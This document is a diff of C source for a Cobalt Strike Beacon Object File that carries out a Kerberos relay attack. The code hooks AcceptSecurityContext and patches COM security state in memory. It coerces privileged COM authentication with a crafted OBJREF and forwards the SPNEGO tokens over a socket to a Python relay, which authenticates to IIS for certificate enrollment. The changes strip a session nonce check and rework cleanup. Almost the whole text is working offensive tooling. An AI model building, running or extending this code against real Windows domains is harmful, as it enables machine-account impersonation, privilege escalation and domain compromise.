@@ -17,24 +17,12 @@
 #include <rpcdcep.h>
 #include <objidl.h>
 #include <objbase.h>
-#ifdef KRBRELAY_PIC
-#include "pic_compat.h"
-#elif defined(KRBRELAY_NATIVE)
-#include "native_compat.h"
-#else
 #include "beacon.h"
-#endif
 #ifdef KRBRELAY_TEST_NDR_ACTIVATION
 #include "dcom_activation.h"
 #endif
 
-#ifdef KRBRELAY_PIC
-/* Function pointer slots are defined by pic_compat.h's BOF_IMPORT. */
-#elif defined(KRBRELAY_NATIVE)
-#define BOF_IMPORT(dll, ret, call, name, args)
-#else
 #define BOF_IMPORT(dll, ret, call, name, args) DECLSPEC_IMPORT ret call dll##$##name args
-#endif
 
 BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetProcessHeap, (void));
 BOF_IMPORT(KERNEL32, LPVOID, WINAPI, HeapAlloc, (HANDLE, DWORD, SIZE_T));
@@ -98,21 +86,13 @@ BOF_IMPORT(WS2_32, int, WSAAPI, send, (SOCKET, const char *, int, int));
 BOF_IMPORT(WS2_32, int, WSAAPI, recv, (SOCKET, char *, int, int));
 BOF_IMPORT(WS2_32, int, WSAAPI, closesocket, (SOCKET));
 
-#ifdef KRBRELAY_PIC
-#include "pic_runtime.h"
-#endif
-
-/* KRB1 v2 binds one BOF to one Python listener before any authentication
-   material crosses the bridge. The target is finished when IIS authenticates;
-   certificate enrollment and its final outcome belong entirely to Python. */
-#define BRIDGE_HELLO        1
-#define BRIDGE_HELLO_OK     2
+/* KRB1 v3 carries the relay tokens. The target is finished when IIS
+   authenticates; enrollment and its final outcome belong to Python. */
 #define BRIDGE_CLIENT_TOKEN 3
 #define BRIDGE_SERVER_TOKEN 4
 #define BRIDGE_AUTH_OK      5
 #define BRIDGE_ERROR        6
-#define BRIDGE_VERSION      2
-#define NONCE_LENGTH        64u
+#define BRIDGE_VERSION      3
 #define MAX_TOKEN           65535u
 #define MAX_ERROR           512u
 
@@ -133,8 +113,8 @@ struct _TRIGGER {
     ULONG objref_len;
 };
 
-/* One mutable state object is sufficient because the sacrificial helper runs
-   one relay before exit. stage/detail diagnose failures; trace is a call map. */
+/* One mutable state object is sufficient because each invocation performs one
+   relay before returning. stage/detail diagnose failures; trace is a call map. */
 typedef struct {
     LONG initialized;
     SOCKET bridge;
@@ -154,12 +134,12 @@ typedef struct {
     WCHAR rpc_host[256];
     WCHAR rpc_endpoint[32];
     WCHAR trigger_clsid[64];
-    char run_nonce[NONCE_LENGTH+1];
     BYTE *continuation;
     ULONG continuation_len;
     PSecurityFunctionTableW table;
     ACCEPT_SECURITY_CONTEXT_FN original_accept;
     int resolver_registered;
+    LONG active_callbacks;
     ANCHOR anchor;
     TRIGGER trigger;
 } RELAY_STATE;
@@ -196,22 +176,13 @@ static void kcopy(void *d_, const void *s_, ULONG n) {
 }
 
 static void kzero(void *d_, ULONG n) { BYTE *d = (BYTE *)d_; ULONG i; for (i = 0; i < n; ++i) d[i] = 0; }
+static LONG atomic_add(volatile LONG *value,LONG delta) { return __sync_add_and_fetch(value,delta); }
+static LONG atomic_read(volatile LONG *value) { return __sync_val_compare_and_swap(value,0,0); }
 static int ascii_to_wide(const char *source, int source_len, WCHAR *target, ULONG target_count) {
     int i, chars = source_len > 0 && source[source_len - 1] == 0 ? source_len - 1 : source_len;
     if (!source || chars < 1 || (ULONG)chars >= target_count) return 0;
     for (i = 0; i < chars; ++i) { if ((BYTE)source[i] > 0x7f) return 0; target[i] = (WCHAR)(BYTE)source[i]; }
     target[chars] = 0; return 1;
-}
-static int copy_nonce(const char *source,int source_len,char target[NONCE_LENGTH+1]) {
-    ULONG i;BYTE c;
-    if(!source||source_len!=(int)NONCE_LENGTH+1||source[NONCE_LENGTH])return 0;
-    for(i=0;i<NONCE_LENGTH;i++){
-        c=(BYTE)source[i];
-        if(c>='A'&&c<='F')c=(BYTE)(c+('a'-'A'));
-        if(!((c>='0'&&c<='9')||(c>='a'&&c<='f')))return 0;
-        target[i]=(char)c;
-    }
-    target[NONCE_LENGTH]=0;return 1;
 }
 static void decimal_port(int value, char out[6]) {
     int i = 5; out[i] = 0;
@@ -240,21 +211,17 @@ static const RPC_CLIENT_INTERFACE activation_interface = {
 };
 /* The advertised IObjectExporter surface establishes the endpoint and auth
    context. COM activation supplies the meaningful unmarshalling operation. */
-static void RPC_ENTRY resolver_dispatch(PRPC_MESSAGE message) { message->BufferLength=0; }
-#ifdef KRBRELAY_PIC
-static RPC_DISPATCH_FUNCTION resolver_functions[6] PIC_DATA;
-static RPC_DISPATCH_TABLE resolver_table PIC_DATA;
-static RPC_SERVER_INTERFACE resolver_interface PIC_DATA;
-#else
-static RPC_DISPATCH_FUNCTION resolver_functions[6]={resolver_dispatch,resolver_dispatch,resolver_dispatch,resolver_dispatch,resolver_dispatch,resolver_dispatch};
-static RPC_DISPATCH_TABLE resolver_table={6,resolver_functions,0};
-static const RPC_SERVER_INTERFACE resolver_interface = {
-    sizeof(RPC_SERVER_INTERFACE),
-    {{0x99fcfec4,0x5260,0x101b,{0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a}},{0,0}},
-    {{0x8a885d04,0x1ceb,0x11c9,{0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60}},{2,0}},
-    &resolver_table,0,NULL,NULL,NULL,0
-};
-#endif
+static void RPC_ENTRY resolver_dispatch(PRPC_MESSAGE message) {
+    atomic_add(&g_state.active_callbacks,1);
+    message->BufferLength=0;
+    atomic_add(&g_state.active_callbacks,-1);
+}
+/* Initialize callback pointers at runtime so the COFF contains no absolute
+   code-pointer relocations. Nonzero scalar sentinels keep these in .data
+   instead of an unsupported zero-fill .bss section. */
+static RPC_DISPATCH_FUNCTION resolver_functions[6]={(RPC_DISPATCH_FUNCTION)1};
+static RPC_DISPATCH_TABLE resolver_table={1,NULL,0};
+static RPC_SERVER_INTERFACE resolver_interface={1};
 
 /* TCP is a byte stream: bridge framing must tolerate short sends/receives. */
 static int send_all(SOCKET s, const BYTE *data, ULONG length) {
@@ -284,7 +251,7 @@ static void report_bridge_error(BYTE *data,ULONG length);
 /* Connect lazily at the first callback and reuse one bridge socket so Python
    can keep the same IIS connection throughout mutual authentication. */
 static int bridge_connect(void) {
-    WSADATA wd; struct addrinfo hints,*addresses=NULL,*current; char service[6];BYTE kind=0,*reply=NULL;ULONG reply_len=0;
+    WSADATA wd; struct addrinfo hints,*addresses=NULL,*current; char service[6];
     if (g_state.bridge != INVALID_SOCKET) return 1;
     BeaconPrintf(CALLBACK_OUTPUT,"[*] Resolving and connecting bridge to %s:%d\n",g_state.relay_host,g_state.relay_port);
     if (!g_state.wsa_ready) {
@@ -295,25 +262,17 @@ static int bridge_connect(void) {
     if(WS2_32$getaddrinfo(g_state.relay_host,service,&hints,&addresses)||!addresses)return 0;
     for(current=addresses;current;current=current->ai_next){g_state.bridge=WS2_32$socket(current->ai_family,current->ai_socktype,current->ai_protocol);if(g_state.bridge!=INVALID_SOCKET&&WS2_32$connect(g_state.bridge,current->ai_addr,(int)current->ai_addrlen)==0)break;if(g_state.bridge!=INVALID_SOCKET)WS2_32$closesocket(g_state.bridge);g_state.bridge=INVALID_SOCKET;}
     WS2_32$freeaddrinfo(addresses);if(g_state.bridge==INVALID_SOCKET)return 0;
-    if(!send_record(BRIDGE_HELLO,(const BYTE*)g_state.run_nonce,NONCE_LENGTH)||!recv_record(&kind,&reply,&reply_len))goto handshake_failed;
-    if(kind==BRIDGE_ERROR){report_bridge_error(reply,reply_len);goto handshake_failed;}
-    if(kind!=BRIDGE_HELLO_OK||reply_len)goto handshake_failed;
-    release(reply);BeaconPrintf(CALLBACK_OUTPUT,"[+] Connected to the matching Python relay session\n");return 1;
-handshake_failed:
-    release(reply);if(g_state.bridge!=INVALID_SOCKET)WS2_32$closesocket(g_state.bridge);g_state.bridge=INVALID_SOCKET;
-    BeaconPrintf(CALLBACK_ERROR,"[-] Python relay session handshake failed\n");return 0;
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] Connected to the Python relay\n");return 1;
 }
 
 static ULONG record_limit(BYTE kind) {
-    if(kind==BRIDGE_HELLO)return NONCE_LENGTH;
-    if(kind==BRIDGE_HELLO_OK||kind==BRIDGE_AUTH_OK)return 0;
+    if(kind==BRIDGE_AUTH_OK)return 0;
     if(kind==BRIDGE_CLIENT_TOKEN||kind==BRIDGE_SERVER_TOKEN)return MAX_TOKEN;
     if(kind==BRIDGE_ERROR)return MAX_ERROR;
     return (ULONG)-1;
 }
 
 static ULONG record_minimum(BYTE kind) {
-    if(kind==BRIDGE_HELLO)return NONCE_LENGTH;
     if(kind==BRIDGE_CLIENT_TOKEN||kind==BRIDGE_SERVER_TOKEN)return 1;
     return 0;
 }
@@ -413,25 +372,13 @@ static HRESULT STDMETHODCALLTYPE marshal_unmarshal(IMarshal*x,IStream*s,REFIID a
 static HRESULT STDMETHODCALLTYPE marshal_release_data(IMarshal*x,IStream*s){(void)x;(void)s;return S_OK;}
 static HRESULT STDMETHODCALLTYPE marshal_disconnect(IMarshal*x,DWORD a){(void)x;(void)a;return S_OK;}
 
-#ifdef KRBRELAY_PIC
-static IUnknownVtbl anchor_vtbl PIC_DATA;
-static IStorageVtbl storage_vtbl PIC_DATA;
-static IMarshalVtbl marshal_vtbl PIC_DATA;
-#else
-static const IUnknownVtbl anchor_vtbl = { anchor_qi, anchor_add, anchor_release };
-static const IStorageVtbl storage_vtbl = {
-    (void*)trigger_qi,(void*)trigger_add,(void*)trigger_release,tr_CreateStream,tr_OpenStream,tr_CreateStorage,tr_OpenStorage,tr_CopyTo,
-    tr_MoveElementTo,tr_Commit,tr_Revert,tr_EnumElements,tr_DestroyElement,tr_RenameElement,tr_SetElementTimes,tr_SetClass,tr_SetStateBits,tr_Stat
-};
-static const IMarshalVtbl marshal_vtbl = {
-    (void*)marshal_qi,(void*)marshal_add,(void*)marshal_release,marshal_class,marshal_size,marshal_iface,marshal_unmarshal,marshal_release_data,marshal_disconnect
-};
-#endif
+static IUnknownVtbl anchor_vtbl={(void*)1};
+static IStorageVtbl storage_vtbl={(void*)1};
+static IMarshalVtbl marshal_vtbl={(void*)1};
 
-#ifdef KRBRELAY_PIC
-static void krbrelay_pic_prepare_interfaces(void) {
-    /* Raw PIC cannot carry absolute function relocations in these vtables, so
-       construct them after the core lands at its final remote address. */
+static void prepare_interfaces(void) {
+    /* Construct callback tables after Cobalt places the COFF at its final
+       address, avoiding loader-specific IMAGE_REL_AMD64_ADDR64 support. */
     int i;
     anchor_vtbl.QueryInterface=anchor_qi;anchor_vtbl.AddRef=anchor_add;anchor_vtbl.Release=anchor_release;
     storage_vtbl.QueryInterface=(void*)trigger_qi;storage_vtbl.AddRef=(void*)trigger_add;storage_vtbl.Release=(void*)trigger_release;
@@ -451,14 +398,13 @@ static void krbrelay_pic_prepare_interfaces(void) {
     resolver_interface.TransferSyntax.SyntaxGUID.Data4[0]=0x9f;resolver_interface.TransferSyntax.SyntaxGUID.Data4[1]=0xe8;resolver_interface.TransferSyntax.SyntaxGUID.Data4[2]=0x08;resolver_interface.TransferSyntax.SyntaxGUID.Data4[5]=0x10;resolver_interface.TransferSyntax.SyntaxGUID.Data4[6]=0x48;resolver_interface.TransferSyntax.SyntaxGUID.Data4[7]=0x60;
     resolver_interface.TransferSyntax.SyntaxVersion.MajorVersion=2;resolver_interface.DispatchTable=&resolver_table;
 }
-#endif
 
 static int build_objref(void) {
     IMoniker *moniker=NULL; IBindCtx *bind=NULL; LPOLESTR display=NULL;
     BYTE *original=NULL,*p,*security;
     ULONG original_len=0,address_chars=0,address_words,string_words,sec_words,total_words,i,display_len=0,spn_chars=0;
     HRESULT hr;
-#if defined(KRBRELAY_TEST_DIRECT_ACTIVATION) || defined(KRBRELAY_TEST_RAW_OBJREF)
+#if defined(KRBRELAY_TEST_RAW_OBJREF)
     if(g_state.com_locked){
         original_len=68;original=(BYTE*)alloc(original_len);if(!original)return 0;
         wr32(original,0x574f454d);wr32(original+4,1);kcopy(original+8,&KIID_IUnknown,16);
@@ -495,7 +441,7 @@ raw_objref_ready:
     else{sec_words=rd16(original+64)-rd16(original+66);security=original+68+rd16(original+66)*2;if(!sec_words||(rd16(security)!=RPC_C_AUTHN_GSS_NEGOTIATE&&rd16(security)!=RPC_C_AUTHN_GSS_KERBEROS)){g_state.stage=66;release(original);return 0;}}
 #endif
 #ifndef KRBRELAY_TEST_REMOTE_RESOLVER
-    BeaconPrintf(CALLBACK_OUTPUT,"[*] Building OBJREF with auth type %u\n",g_state.synthesize_security?(g_state.com_locked?RPC_C_AUTHN_GSS_KERBEROS:RPC_C_AUTHN_GSS_NEGOTIATE):rd16(security));
+    BeaconPrintf(CALLBACK_OUTPUT,"[*] Building OBJREF with auth type %u\n",g_state.synthesize_security?RPC_C_AUTHN_GSS_NEGOTIATE:rd16(security));
 #endif
     total_words=string_words+sec_words;
     g_state.trigger.objref_len=68+total_words*2;
@@ -508,7 +454,7 @@ raw_objref_ready:
 #ifdef KRBRELAY_TEST_REMOTE_RESOLVER
     wr16(p,0);
 #else
-    if(g_state.synthesize_security){wr16(p,g_state.com_locked?RPC_C_AUTHN_GSS_KERBEROS:RPC_C_AUTHN_GSS_NEGOTIATE);wr16(p+2,0xffff);p+=4;for(i=0;i<=spn_chars;i++){wr16(p,g_state.service_spn[i]);p+=2;}wr16(p,0);}
+    if(g_state.synthesize_security){wr16(p,RPC_C_AUTHN_GSS_NEGOTIATE);wr16(p+2,0xffff);p+=4;for(i=0;i<=spn_chars;i++){wr16(p,g_state.service_spn[i]);p+=2;}wr16(p,0);}
     else kcopy(p,security,sec_words*2);
 #endif
     release(original);
@@ -667,15 +613,17 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(PCredHandle cred,PCtxtHandle contex
      * The privileged client consequently consumes the AP-REP and emits the
      * next SPNEGO leg without the BOF needing Kerberos keys or ASN.1 mutation.
      */
-    BYTE *rpc=NULL,*reply=NULL,*out_target=NULL; ULONG rpc_len=0,reply_len=0,auth_len,frag_len,token_off=0,out_index=0,out_off=0,i; BYTE kind=0,auth_type=0;
+    BYTE *rpc=NULL,*reply=NULL,*out_target=NULL; ULONG rpc_len=0,reply_len=0,auth_len=0,frag_len=0,token_off=0,out_index=0,out_off=0,i; BYTE kind=0,auth_type=0;int relay_rpc=0;
     SecBuffer tempbuf; SecBufferDesc tempdesc; SECURITY_STATUS status;
-    if(g_state.success)return g_state.original_accept(cred,context,input,req,rep,newctx,output,attrs,expiry);
+    atomic_add(&g_state.active_callbacks,1);
+    if(g_state.success){status=g_state.original_accept(cred,context,input,req,rep,newctx,output,attrs,expiry);goto accept_return;}
     if(extract_rpc(input,&rpc,&rpc_len)){
         frag_len=rd16(rpc+8);auth_len=rd16(rpc+10);
-        if(auth_len&&frag_len<=rpc_len&&frag_len>=8&&auth_len<=frag_len-8){token_off=frag_len-auth_len;auth_type=rpc[token_off-8];
+        if(rpc[0]==5&&(rpc[4]&0xf0)==0x10&&auth_len&&frag_len<=rpc_len&&frag_len>=8&&auth_len<=frag_len-8){token_off=frag_len-auth_len;auth_type=rpc[token_off-8];
+            relay_rpc=auth_type==RPC_C_AUTHN_GSS_NEGOTIATE||auth_type==RPC_C_AUTHN_GSS_KERBEROS;
             BeaconPrintf(CALLBACK_OUTPUT,"[*] Captured RPC auth type %u / leg %d (fragment %lu bytes, auth_value %lu bytes, top tag 0x%02x)\n",rpc[token_off-8],g_state.callback_count+1,frag_len,auth_len,rpc[token_off]);
         }
-        if(auth_len&&frag_len<=rpc_len&&token_off>=8&&token_off<=frag_len&&(auth_type==RPC_C_AUTHN_GSS_NEGOTIATE||auth_type==RPC_C_AUTHN_GSS_KERBEROS)&&bridge_connect()&&send_record(BRIDGE_CLIENT_TOKEN,rpc+token_off,auth_len)&&recv_auth_reply(&kind,&reply,&reply_len)){
+        if(relay_rpc&&bridge_connect()&&send_record(BRIDGE_CLIENT_TOKEN,rpc+token_off,auth_len)&&recv_auth_reply(&kind,&reply,&reply_len)){
             BeaconPrintf(CALLBACK_OUTPUT,"[*] Relayed opaque SPNEGO leg %d\n",g_state.callback_count+1);
             if(kind==BRIDGE_SERVER_TOKEN&&reply_len){BeaconPrintf(CALLBACK_OUTPUT,"[+] Received IIS continuation (%lu bytes, top tag 0x%02x); preparing it for the RPCSS response\n",reply_len,reply[0]);g_state.trace|=32;release(g_state.continuation);g_state.continuation=reply;g_state.continuation_len=reply_len;reply=NULL;}
             else if(kind==BRIDGE_AUTH_OK){g_state.success=1;BeaconPrintf(CALLBACK_OUTPUT,"[+] IIS authenticated the relayed machine connection; Python now owns enrollment\n");}
@@ -683,17 +631,7 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(PCredHandle cred,PCtxtHandle contex
         }
     }
     release(rpc);release(reply);
-    if(auth_type&&auth_type!=RPC_C_AUTHN_GSS_NEGOTIATE&&auth_type!=RPC_C_AUTHN_GSS_KERBEROS){
-        status=g_state.original_accept(cred,context,input,req,rep,newctx,output,attrs,expiry);
-        BeaconPrintf(CALLBACK_OUTPUT,"[*] Existing COM acceptor returned SSPI 0x%08x for local auth type %u\n",(ULONG)status,auth_type);
-#ifdef KRBRELAY_ENABLE_AUTH_CONVERSION
-        if(status==SEC_E_OK&&g_state.com_locked&&!g_state.success)relay_as_impersonated_client(newctx?newctx:context);
-#else
-        if(status==SEC_E_OK&&g_state.com_locked&&!g_state.success)BeaconPrintf(CALLBACK_ERROR,"[-] Non-Kerberos COM authentication conversion is disabled in this build\n");
-#endif
-        g_state.callback_count++;
-        return status;
-    }
+    if(!relay_rpc){status=g_state.original_accept(cred,context,input,req,rep,newctx,output,attrs,expiry);goto accept_return;}
     tempbuf.BufferType=SECBUFFER_TOKEN;tempbuf.cbBuffer=12288;tempbuf.pvBuffer=alloc(tempbuf.cbBuffer);
     tempdesc.ulVersion=SECBUFFER_VERSION;tempdesc.cBuffers=1;tempdesc.pBuffers=&tempbuf;
     status=g_state.original_accept(cred,context,input,req,rep,newctx,&tempdesc,attrs,expiry);release(tempbuf.pvBuffer);
@@ -713,6 +651,8 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(PCredHandle cred,PCtxtHandle contex
 accept_done:
     release(g_state.continuation);g_state.continuation=NULL;g_state.continuation_len=0;
     g_state.callback_count++;
+accept_return:
+    atomic_add(&g_state.active_callbacks,-1);
     return status;
 }
 
@@ -733,6 +673,23 @@ static LONG *find_com_security_gate(void) {
     if(!module)return NULL;entry=(BYTE*)KERNEL32$GetProcAddress(module,"CoInitializeSecurity");if(!entry)return NULL;
     for(i=0;i<256;i++)if(entry[i]==0x39&&entry[i+1]==0x3d&&entry[i+6]==0x0f&&entry[i+7]==0x84){LONG displacement=*(LONG*)(entry+i+2);return (LONG*)(entry+i+6+displacement);}
     return NULL;
+}
+
+static int release_caller_com_apartment(void) {
+    /* If the long-lived Beacon task thread retained COM from an earlier
+       operation, balance that thread's apartment references before creating
+       the BOF-owned STA. CoInitializeEx is used only to distinguish whether a
+       reference existed; every successful probe reference is balanced. */
+    LONG *gate=find_com_security_gate();HRESULT hr;int released=0,i;
+    if(!gate||!*gate)return 0;
+    for(i=0;i<8;i++){
+        hr=OLE32$CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
+        if(hr==S_OK){OLE32$CoUninitialize();break;}
+        if(hr==S_FALSE){OLE32$CoUninitialize();OLE32$CoUninitialize();released++;continue;}
+        if(hr==RPC_E_CHANGED_MODE){OLE32$CoUninitialize();released++;continue;}
+        break;
+    }
+    return released;
 }
 
 static KUNICODE_STRING *patch_firewall_name(BYTE saved[14]) {
@@ -772,7 +729,7 @@ static int run_relay(void) {
         if(FAILED(hr)&&KERNEL32$VirtualProtect(security_gate,sizeof(*security_gate),PAGE_READWRITE,&gate_protection)){*security_gate=saved_gate;*security_info=saved_security_info;KERNEL32$VirtualProtect(security_gate,sizeof(*security_gate),gate_protection,&temp_protection);}
     }
 #endif
-    if(hr==RPC_E_TOO_LATE){g_state.com_locked=1;BeaconPrintf(CALLBACK_OUTPUT,"[!] COM security was already initialized before this BOF invocation\n");}
+    if(hr==RPC_E_TOO_LATE){g_state.stage=32;g_state.detail=(int)hr;BeaconPrintf(CALLBACK_ERROR,"[-] Process COM security is already immutable; run this direct BOF first in a fresh Beacon\n");return 0;}
     else if(FAILED(hr)){g_state.detail=(int)hr;return 0;}
     if(!g_state.com_locked&&FAILED(svc.hr)){g_state.stage=31;g_state.detail=(int)svc.hr;return 0;}
     if(g_state.com_locked)g_state.synthesize_security=1;
@@ -824,17 +781,37 @@ static int run_relay(void) {
     g_state.stage=80;return g_state.success;
 }
 
+static void wait_callback_quiescence(void) {
+    ULONG i,quiet=0;
+    for(i=0;i<500;i++){
+        if(atomic_read(&g_state.active_callbacks)==0){if(++quiet>=25)return;}
+        else quiet=0;
+        KERNEL32$Sleep(10);
+    }
+}
+
+static void cleanup_relay(void) {
+    if(g_state.resolver_registered){RPCRT4$RpcServerUnregisterIf((RPC_IF_HANDLE)&resolver_interface,NULL,TRUE);g_state.resolver_registered=0;}
+    remove_hook();
+    wait_callback_quiescence();
+    if(g_state.com_ready){OLE32$CoUninitialize();g_state.com_ready=0;}
+    wait_callback_quiescence();
+    release(g_state.continuation);g_state.continuation=NULL;
+    if(g_state.bridge!=INVALID_SOCKET){WS2_32$closesocket(g_state.bridge);g_state.bridge=INVALID_SOCKET;}
+    if(g_state.wsa_ready){WS2_32$WSACleanup();g_state.wsa_ready=0;}
+}
+
 static DWORD WINAPI relay_worker(LPVOID unused) {
     DWORD result=(DWORD)run_relay();(void)unused;
-    if(g_state.com_ready){OLE32$CoUninitialize();g_state.com_ready=0;}
+    cleanup_relay();
     return result;
 }
 
 void go(char *args, unsigned long alen) {
     /* Validate every packed endpoint before entering COM. In production this
-       executes on the raw-PIC thread inside the clean sacrificial process. */
-    datap parser; char *value; int value_len=0,port;HANDLE worker=NULL;
-    kzero(&g_state,sizeof(g_state));g_state.initialized=1;g_state.bridge=INVALID_SOCKET;
+       worker stays inside the invoking Beacon process for its full lifetime. */
+    datap parser; char *value; int value_len=0,port,caller_com_releases;HANDLE worker=NULL;
+    kzero(&g_state,sizeof(g_state));prepare_interfaces();g_state.initialized=1;g_state.bridge=INVALID_SOCKET;
 #ifdef KRBRELAY_TEST_PREINITIALIZED_COM
     OLE32$CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
     OLE32$CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_DYNAMIC_CLOAKING,NULL);
@@ -842,6 +819,8 @@ void go(char *args, unsigned long alen) {
     OLE32$CoUninitialize();
 #endif
 #endif
+    caller_com_releases=release_caller_com_apartment();
+    if(caller_com_releases)BeaconPrintf(CALLBACK_OUTPUT,"[*] Released %d retained COM apartment reference(s) on the Beacon task thread\n",caller_com_releases);
     if(!args||alen<4){g_state.stage=1;goto relay_done;}BeaconDataParse(&parser,args,(int)alen);
     value=BeaconDataExtract(&parser,&value_len);if(!value||value_len<2||value_len>(int)sizeof(g_state.relay_host)){g_state.stage=2;goto relay_done;}kcopy(g_state.relay_host,value,(ULONG)value_len);g_state.relay_host[value_len-1]=0;
     port=BeaconDataInt(&parser);if(port<1||port>65535){g_state.stage=3;goto relay_done;}g_state.relay_port=port;
@@ -849,33 +828,8 @@ void go(char *args, unsigned long alen) {
     value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.rpc_host,sizeof(g_state.rpc_host)/sizeof(WCHAR))){g_state.stage=5;goto relay_done;}
     value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.rpc_endpoint,sizeof(g_state.rpc_endpoint)/sizeof(WCHAR))){g_state.stage=6;goto relay_done;}
     value=BeaconDataExtract(&parser,&value_len);if(!ascii_to_wide(value,value_len,g_state.trigger_clsid,sizeof(g_state.trigger_clsid)/sizeof(WCHAR))){g_state.stage=7;goto relay_done;}
-    value=BeaconDataExtract(&parser,&value_len);if(!copy_nonce(value,value_len,g_state.run_nonce)){g_state.stage=8;goto relay_done;}
-    BeaconPrintf(CALLBACK_OUTPUT,"[*] KrbRelay BOF starting with a session-bound bridge, SPN, RPC binding, and COM trigger\n");
-#ifdef KRBRELAY_TEST_WORKER_STA
+    BeaconPrintf(CALLBACK_OUTPUT,"[*] KrbRelay direct BOF starting in the invoking process\n");
     worker=KERNEL32$CreateThread(NULL,0,relay_worker,NULL,0,NULL);if(!worker){g_state.stage=9;g_state.detail=(int)KERNEL32$GetLastError();goto relay_done;}KERNEL32$WaitForSingleObject(worker,INFINITE);KERNEL32$CloseHandle(worker);
-#else
-    if(run_relay())BeaconPrintf(CALLBACK_OUTPUT,"[+] Machine authentication relayed to IIS; Python is completing enrollment\n");
-#endif
 relay_done: if(!g_state.success)BeaconPrintf(CALLBACK_ERROR,"[-] KrbRelay chain failed at stage %d (COM HRESULT 0x%08x), trace %d, callbacks %d\n",g_state.stage,(ULONG)g_state.detail,g_state.trace,g_state.callback_count);
-    remove_hook();release(g_state.continuation);
-    if(g_state.resolver_registered)RPCRT4$RpcServerUnregisterIf((RPC_IF_HANDLE)&resolver_interface,NULL,FALSE);
-    if(g_state.bridge!=INVALID_SOCKET)WS2_32$closesocket(g_state.bridge);
-    if(g_state.wsa_ready)WS2_32$WSACleanup();
-    if(g_state.com_ready)OLE32$CoUninitialize();
+    if(!worker)cleanup_relay();
 }
-
-#ifdef KRBRELAY_PIC
-/* Windows LPTHREAD_START_ROUTINE entry point. The launcher places a canonical
-   BOF argument block at lpParameter. 0x901-0x903 mean bootstrap failure;
-   0x10NN identifies the run_relay stage NN which failed. */
-__attribute__((section(".text.entry"))) DWORD WINAPI krbrelay_pic_entry(LPVOID parameter) {
-    DWORD remaining;
-    if(!parameter)return 0x901;
-    remaining=*(DWORD *)parameter;
-    if(remaining<4||remaining>4092)return 0x902;
-    if(!krbrelay_pic_resolve())return 0x903;
-    krbrelay_pic_prepare_interfaces();
-    go((char *)parameter,remaining+4);
-    return g_state.success?0:(DWORD)(0x1000+(g_state.stage&0xff));
-}
-#endif
